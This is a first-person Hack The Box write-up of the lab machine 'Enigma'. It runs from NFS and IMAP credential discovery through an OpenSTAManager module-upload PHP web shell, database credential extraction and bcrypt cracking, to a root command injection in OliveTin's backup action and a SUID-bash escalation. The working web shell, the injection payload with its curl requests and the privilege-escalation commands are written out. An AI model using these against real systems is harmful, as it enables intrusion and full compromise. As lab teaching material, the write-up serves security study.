# Hack The Box — Enigma

> **Platform:** Hack The Box  
> **Target:** Enigma  
> **OS:** Linux  
> **Difficulty:** Easy  
> **Focus:** NFS enumeration, credential discovery, IMAP, password reuse, OpenSTAManager, RCE, MariaDB, bcrypt cracking, localhost service enumeration, OliveTin command injection, privilege escalation

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Initial Enumeration](#2-initial-enumeration)
- [3. NFS Enumeration](#3-nfs-enumeration)
- [4. Discovering Credentials](#4-discovering-credentials)
- [5. IMAP and Roundcube](#5-imap-and-roundcube)
- [6. Credential Reuse](#6-credential-reuse)
- [7. OpenSTAManager](#7-openstamanager)
- [8. Remote Code Execution](#8-remote-code-execution)
- [9. Obtaining a Shell](#9-obtaining-a-shell)
- [10. OpenSTAManager Database Credentials](#10-openstamanager-database-credentials)
- [11. Extracting and Cracking the Haris Hash](#11-extracting-and-cracking-the-haris-hash)
- [12. Access as Haris](#12-access-as-haris)
- [13. Local Enumeration](#13-local-enumeration)
- [14. Discovering OliveTin](#14-discovering-olivetin)
- [15. OliveTin Command Injection](#15-olivetin-command-injection)
- [16. Root Access](#16-root-access)
- [17. Attack Chain](#17-attack-chain)
- [18. Key Takeaways](#18-key-takeaways)
- [19. Command Reference](#19-command-reference)

---

# 1. Overview

Enigma is a Linux machine built around a multi-stage attack chain. The initial foothold is obtained by combining an exposed NFS share with credential discovery through IMAP and password reuse. Those credentials lead to an OpenSTAManager installation where remote code execution provides a `www-data` shell. From there, database credentials can be recovered, a bcrypt hash can be cracked to obtain the `haris` account password, and local enumeration reveals OliveTin running as `root` on localhost. Its unauthenticated action API can then be abused through command injection to execute commands as root.

The attack path was:

```text
Port Enumeration
        ↓
NFS Discovery
        ↓
Onboarding PDF
        ↓
Credentials
        ↓
IMAP / Roundcube
        ↓
Password Reuse
        ↓
OpenSTAManager
        ↓
Module Update RCE
        ↓
www-data Shell
        ↓
config.inc.php
        ↓
MariaDB Credentials
        ↓
zz_users Table
        ↓
Haris bcrypt Hash
        ↓
Hash Cracking
        ↓
haris
        ↓
Local Enumeration
        ↓
OliveTin on 127.0.0.1:1337
        ↓
Unauthenticated Action API
        ↓
Command Injection
        ↓
root
```

The main lesson from Enigma is that the most important vulnerability is not necessarily visible from the initial network scan. Each successful step exposes a new layer of the target's attack surface.

---

# 2. Initial Enumeration

I started with a full TCP port scan against the target:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <TARGET_IP> -oG ports
```

The relevant services were:

```text
22/tcp    open   ssh
80/tcp    open   http
110/tcp   open   pop3
111/tcp   open   rpcbind
143/tcp   open   imap
993/tcp   open   ssl/imap
995/tcp   open   ssl/pop3
2049/tcp  open   nfs
```

I then performed service and version detection:

```bash
nmap -sCV -p22,80,110,111,143,993,995,2049 <TARGET_IP>
```

The presence of **NFS**, **IMAP/POP3**, and HTTP immediately suggested several possible information-disclosure paths. I started with NFS because it was exposing a share directly over the network.

---

# 3. NFS Enumeration

Nmap's NFS scripts identified an accessible export:

```text
/srv/nfs/onboarding
```

I enumerated the NFS exports:

```bash
showmount -e <TARGET_IP>
```

I then mounted the share locally. On Parrot, the NFS client tools were not initially installed, so I installed `nfs-common` first.

The share contained:

```text
New_Employee_Access.pdf
```

I extracted and inspected the document:

```bash
cp /mnt/nfs/onboarding/New_Employee_Access.pdf .
```

The PDF contained useful employee access information, which became the starting point for the mail-service enumeration.

The important lesson here is that shared network storage should always be inspected for onboarding documents, backups, configuration files, credentials, and other internal documentation.

---

# 4. Discovering Credentials

The onboarding document provided credentials that were valid for the internal mail environment.

The webmail interface was available through:

```text
mail001.enigma.htb
```

I added the relevant hostnames to `/etc/hosts` as necessary so the virtual hosts resolved correctly.

The recovered credentials included the account:

```text
kevin
```

with the password:

```text
Enigma2024!
```

At this point, the useful direction was not SSH. Instead, the credentials were tested against the exposed mail services.

---

# 5. IMAP and Roundcube

The target exposed secure IMAP on port 993:

```bash
openssl s_client -connect mail001.enigma.htb:993 -crlf
```

I authenticated with IMAP using:

```text
A1 LOGIN kevin Enigma2024!
```

After authentication, I enumerated the available mailboxes:

```text
A1 LIST "" "*"
```

The account had the usual folders including `INBOX`, `Sent`, and `Trash`.

The inbox contained an internal message from `sarah@enigma.htb` indicating that Kevin's access credentials would be delivered through the company shared drive.

The important observation was that the recovered password was being reused inside the mail environment. Since SSH authentication did not accept it, I tested the same password against another user's mailbox.

Using the reused password against Sarah's mailbox exposed another internal email from IT Support containing access information for the support system.

The email pointed to:

```text
http://support_001.enigma.htb
```

with:

```text
Username: admin
Password: Ne3s4rtars78
```

This created the next stage of the attack chain.

---

# 6. Credential Reuse

I authenticated to the support application using:

```text
Username: admin
Password: Ne3s4rtars78
```

The application was identified as **OpenSTAManager**.

This was a classic example of credential reuse turning a low-impact information disclosure into direct access to an internal administrative interface.

Whenever credentials are discovered during enumeration, they should be tested against all relevant services already exposed by the target.

---

# 7. OpenSTAManager

The support portal was running OpenSTAManager, and the installation exposed an administrative update/module functionality.

I identified the OpenSTAManager version and focused on the module update mechanism because it allowed administrative users to upload modules to the application.

The important observation was that uploaded module content was placed inside the application's web-accessible directory.

This meant that a malicious PHP module could potentially become directly executable by the web server.

---

# 8. Remote Code Execution

I created a minimal PHP module that executed a command supplied through a query parameter.

A simplified example was:

```php
<?php
if (isset($_GET['c'])) {
    system($_GET['c']);
}
?>
```

I packaged the module as a ZIP archive and uploaded it through the OpenSTAManager module updater.

Once deployed, I verified code execution with:

```bash
curl "http://support_001.enigma.htb/modules/shell/shell.php?c=id"
```

The response confirmed execution as the web-server account:

```text
uid=33(www-data)
```

This established remote code execution and provided the initial foothold on the operating system.

---

# 9. Obtaining a Shell

I used the PHP command execution primitive to obtain a reverse shell and then stabilized the resulting shell.

The resulting shell was running as:

```text
www-data
```

To obtain a usable interactive terminal, I used:

```bash
script /dev/null -c bash
```

I then confirmed the account:

```bash
id
```

The important result was:

```text
uid=33(www-data) gid=33(www-data)
```

At this stage, the application-level vulnerability had been converted into OS-level access.

---

# 10. OpenSTAManager Database Credentials

With shell access, I inspected the web application's configuration files.

The OpenSTAManager installation was located under:

```text
/var/www/html/openstamanager/
```

The key configuration file was:

```bash
cat /var/www/html/openstamanager/config.inc.php
```

It contained the database connection details:

```php
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

These credentials provided access to the local MariaDB instance.

I connected with:

```bash
mysql -u brollin -p
```

Then selected the application database:

```sql
USE openstamanager;
```

I enumerated the tables:

```sql
SHOW TABLES;
```

The interesting table was:

```text
zz_users
```

I queried the users:

```sql
SELECT * FROM zz_users;
```

Among the returned accounts was `haris`, together with a bcrypt password hash.

---

# 11. Extracting and Cracking the Haris Hash

I copied the bcrypt hash to the attacking machine and stored it in:

```text
haris_hash.txt
```

Hashcat uses mode `3200` for bcrypt, so I ran:

```bash
hashcat -m 3200 haris_hash.txt /usr/share/wordlists/rockyou.txt
```

The hash was successfully cracked.

The recovered password was:

```text
bestfriends
```

This provided credentials for the local `haris` account.

---

# 12. Access as Haris

SSH authentication was not the intended route for this account, so I used the password locally from the existing `www-data` shell:

```bash
su haris
```

After entering:

```text
bestfriends
```

I confirmed the account:

```bash
whoami
```

which returned:

```text
haris
```

At this point, I had a proper user-level account and continued with local privilege-escalation enumeration.

---

# 13. Local Enumeration

I first checked sudo privileges:

```bash
sudo -l
```

There was no useful sudo entry for `haris`.

The next important step was enumerating locally listening services:

```bash
ss -tlnp
```

Among the output were:

```text
127.0.0.1:3306
127.0.0.1:1337
```

Port `3306` was the local MariaDB service already identified from the OpenSTAManager configuration.

Port `1337`, however, represented a new internal service that was not exposed during the original remote enumeration.

This is a key lesson in Linux enumeration: **a service bound to `127.0.0.1` may be invisible from the attacker machine but fully reachable after obtaining local access.**

---

# 14. Discovering OliveTin

I identified the process behind the new local service:

```bash
ps aux | grep -i olivetin
```

The process was:

```text
root        1347 ... /usr/local/bin/OliveTin
```

This immediately made the service interesting because OliveTin was running as `root`.

I then inspected its configuration:

```bash
cat /etc/OliveTin/config.yaml
```

The configuration showed that OliveTin was listening on:

```yaml
listenAddressSingleHTTPFrontend: 127.0.0.1:1337
```

The configuration also defined a database-backup action:

```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
```

More importantly, authentication for guests was disabled:

```yaml
authRequireGuestsToLogin: false
```

Therefore, the service exposed an unauthenticated action interface capable of executing commands through OliveTin, which itself was running as `root`.

---

# 15. OliveTin Command Injection

I first verified that the local API was reachable:

```bash
curl -s http://127.0.0.1:1337/api
```

The server redirected `/api` to `/api/`, while the root API path itself returned `Not Found`. This did not mean that the API was unavailable; it simply meant that the action endpoint had to be called directly.

I identified the action endpoint and sent an otherwise harmless request to `backup_database`:

```bash
curl -s -X POST "http://127.0.0.1:1337/api/StartActionAndWait" \
  -H "Content-Type: application/json" \
  --data '{"actionId":"backup_database","arguments":[{"name":"db_user","value":"test"},{"name":"db_pass","value":"test"},{"name":"db_name","value":"test"}]}'
```

The API executed the action but returned an error because the destination directory did not exist. The important point was that the action itself was being executed successfully and the API identified the caller as:

```text
user: guest
```

The vulnerable command was constructed as:

```bash
mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql
```

The `db_pass` argument was inserted directly into a shell command between single quotes. By supplying a value that closed the existing quote, injected a new command, and commented out the remainder, I was able to execute arbitrary shell commands.

The test payload was:

```text
x'; id; #
```

The corresponding request was:

```bash
curl -s -X POST "http://127.0.0.1:1337/api/StartActionAndWait" \
  -H "Content-Type: application/json" \
  --data '{"actionId":"backup_database","arguments":[{"name":"db_user","value":"test"},{"name":"db_pass","value":"x'\''; id; #"},{"name":"db_name","value":"test"}]}'
```

The response contained:

```text
uid=0(root) gid=0(root) groups=0(root)
```

This was the critical proof-of-concept: **OliveTin was executing attacker-controlled commands as root**.

The injection works because the supplied single quote terminates the quoted password value. The semicolon starts a new command, `id` is executed, and `#` comments out the rest of the original command.

Conceptually, the vulnerable command changes from:

```bash
mysqldump -u test -pxxxx test > /opt/backups/backup.sql
```

to something equivalent to:

```bash
mysqldump -u test -px'; id; #' test > /opt/backups/backup.sql
```

The important security failure was therefore not the `mysqldump` command itself, but the unsafe construction of a shell command from untrusted input.

---

# 16. Root Access

Once the command injection was confirmed to execute as UID 0, the remaining step was to turn arbitrary root command execution into a root shell.

One possible technique in the HTB environment is to use the injection to create a root-owned SUID copy of Bash:

```bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
```

The commands are executed by OliveTin, so the resulting binary is owned by `root` and has the SUID bit set.

Afterward, from the `haris` shell:

```bash
/tmp/rootbash -p
```

The `-p` option preserves the effective privileges inherited from the SUID binary.

The privilege level can then be verified with:

```bash
whoami
```

Expected result:

```text
root
```

The final flag can then be retrieved with:

```bash
cat /root/root.txt
```

---

# 17. Attack Chain

The complete attack path can be summarized as:

```text
┌──────────────────────────────────────────┐
│ 1. Port Enumeration                      │
│    SSH / HTTP / IMAP / POP3 / NFS       │
└───────────────────┬──────────────────────┘
                    │
                    ▼
┌──────────────────────────────────────────┐
│ 2. NFS Share                             │
│    /srv/nfs/onboarding                   │
└───────────────────┬──────────────────────┘
                    │
                    ▼
┌──────────────────────────────────────────┐
│ 3. Onboarding PDF                        │
│    Credential Disclosure                 │
└───────────────────┬──────────────────────┘
                    │
                    ▼
┌──────────────────────────────────────────┐
│ 4. IMAP / Roundcube                      │
│    Password Reuse                        │
└───────────────────┬──────────────────────┘
                    │
                    ▼
┌──────────────────────────────────────────┐
│ 5. OpenSTAManager                        │
│    admin access                          │
└───────────────────┬──────────────────────┘
                    │
                    ▼
┌──────────────────────────────────────────┐
│ 6. Module Update RCE                     │
│    www-data                              │
└───────────────────┬──────────────────────┘
                    │
                    ▼
┌──────────────────────────────────────────┐
│ 7. config.inc.php                        │
│    MariaDB credentials                   │
└───────────────────┬──────────────────────┘
                    │
                    ▼
┌──────────────────────────────────────────┐
│ 8. zz_users                              │
│    Haris bcrypt hash                     │
└───────────────────┬──────────────────────┘
                    │
                    ▼
┌──────────────────────────────────────────┐
│ 9. Hashcat                               │
│    bestfriends                           │
└───────────────────┬──────────────────────┘
                    │
                    ▼
┌──────────────────────────────────────────┐
│ 10. su haris                             │
└───────────────────┬──────────────────────┘
                    │
                    ▼
┌──────────────────────────────────────────┐
│ 11. Local Enumeration                    │
│     127.0.0.1:1337                      │
└───────────────────┬──────────────────────┘
                    │
                    ▼
┌──────────────────────────────────────────┐
│ 12. OliveTin as root                    │
└───────────────────┬──────────────────────┘
                    │
                    ▼
┌──────────────────────────────────────────┐
│ 13. Unauthenticated Action API           │
│     backup_database                      │
└───────────────────┬──────────────────────┘
                    │
                    ▼
┌──────────────────────────────────────────┐
│ 14. Command Injection                    │
│     db_pass → shell                      │
└───────────────────┬──────────────────────┘
                    │
                    ▼
┌──────────────────────────────────────────┐
│ 15. Root Command Execution               │
│     uid=0                                 │
└──────────────────────────────────────────┘
```

---

# 18. Key Takeaways

### 1. NFS shares can expose highly sensitive internal data

Network shares are often overlooked during initial enumeration. Documents intended for legitimate employees can contain usernames, passwords, internal URLs, or operational information that immediately expands the attack surface.

### 2. Password reuse is a major attack-chain enabler

The credentials discovered through the mail environment did not directly provide SSH access, but they were useful elsewhere. Credentials should therefore be tested against all relevant services, not only the first one where they were found.

### 3. Administrative file-upload functionality deserves careful inspection

OpenSTAManager's module functionality turned a valid administrative account into remote code execution because uploaded PHP content became executable by the web server.

### 4. Configuration files are high-value targets after gaining RCE

Once `www-data` access was obtained, `config.inc.php` immediately exposed local database credentials. This is a common post-exploitation pattern: application RCE frequently leads to configuration disclosure, which leads to database access, which can then lead to operating-system credentials.

### 5. Local enumeration reveals services invisible from the network

The original Nmap scan could not show:

```text
127.0.0.1:1337
```

because the service was bound to localhost. After obtaining a shell, however, `ss -tlnp` revealed the service and local enumeration exposed a completely new attack surface.

### 6. Port numbers are clues, not conclusions

Seeing `1337` did not prove that the service was OliveTin. The correct workflow was:

```text
ss -tlnp
    ↓
Identify interesting local port
    ↓
Find owning process
    ↓
Inspect configuration
    ↓
Understand attack surface
```

In this case:

```text
127.0.0.1:1337
        ↓
/usr/local/bin/OliveTin
        ↓
Runs as root
        ↓
Inspect /etc/OliveTin/config.yaml
```

### 7. Command injection often comes from unsafe shell construction

The vulnerable action directly concatenated `db_pass` into a shell command. Input validation alone is not enough when untrusted values are interpolated into shell syntax.

The dangerous pattern was:

```bash
somecommand -p'{{ user_input }}'
```

rather than passing arguments safely without invoking a shell.

### 8. Attack chains matter more than isolated vulnerabilities

Enigma demonstrates how individually moderate weaknesses can combine into full system compromise:

```text
NFS Disclosure
      ↓
Credential Reuse
      ↓
Administrative Web Access
      ↓
RCE
      ↓
Database Credentials
      ↓
Password Cracking
      ↓
User Access
      ↓
Local Service Enumeration
      ↓
Root Command Injection
      ↓
root
```

---

# 19. Command Reference

## NFS Enumeration

```bash
showmount -e <TARGET_IP>
```

```bash
sudo mount -t nfs <TARGET_IP>:/srv/nfs/onboarding /mnt/nfs
```

## Port Enumeration

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <TARGET_IP> -oG ports
```

```bash
nmap -sCV -p22,80,110,111,143,993,995,2049 <TARGET_IP>
```

## IMAP

```bash
openssl s_client -connect mail001.enigma.htb:993 -crlf
```

```text
A1 LOGIN kevin Enigma2024!
```

## Shell Stabilization

```bash
script /dev/null -c bash
```

## OpenSTAManager Configuration

```bash
cat /var/www/html/openstamanager/config.inc.php
```

## MariaDB

```bash
mysql -u brollin -p
```

```sql
SHOW DATABASES;
```

```sql
USE openstamanager;
```

```sql
SHOW TABLES;
```

```sql
SELECT * FROM zz_users;
```

## Hashcat

```bash
hashcat -m 3200 haris_hash.txt /usr/share/wordlists/rockyou.txt
```

```bash
hashcat -m 3200 haris_hash.txt /usr/share/wordlists/rockyou.txt --show
```

## User Access

```bash
su haris
```

## Local Enumeration

```bash
sudo -l
```

```bash
ss -tlnp
```

```bash
ps aux | grep -i olivetin
```

## OliveTin

```bash
cat /etc/OliveTin/config.yaml
```

```bash
curl -s http://127.0.0.1:1337/api
```

## OliveTin Action API

```bash
curl -s -X POST "http://127.0.0.1:1337/api/StartActionAndWait" \
  -H "Content-Type: application/json" \
  --data '{"actionId":"backup_database","arguments":[{"name":"db_user","value":"test"},{"name":"db_pass","value":"x'\''; id; #"},{"name":"db_name","value":"test"}]}'
```

## Root Verification

```bash
whoami
```

```bash
id
```

```bash
cat /root/root.txt
```

---

# Final Notes

Enigma demonstrates a complete penetration-testing workflow in which each successful compromise exposes the information required for the next stage. The attack begins outside the host with NFS and mail enumeration, transitions through credential reuse and web-application RCE, and finally relies on local service enumeration to discover a root-level command-execution primitive.

The most important part of the machine was recognizing the difference between **what was externally exposed** and **what became accessible after gaining a shell**. The local `127.0.0.1:1337` service was not visible during the initial network scan, but once identified as OliveTin and correlated with its root execution context and unsafe configuration, it became the final escalation path.

The complete attack chain was:

```text
NFS
 ↓
Credentials
 ↓
IMAP / Roundcube
 ↓
Password Reuse
 ↓
OpenSTAManager
 ↓
RCE
 ↓
www-data
 ↓
MariaDB Credentials
 ↓
Haris Hash
 ↓
Password Cracking
 ↓
haris
 ↓
Local OliveTin
 ↓
Command Injection
 ↓
root
```

**The key lesson from Enigma is to keep enumerating after every foothold. New local services, configuration files, and privileged processes can completely change the attack surface once you are inside the target.**
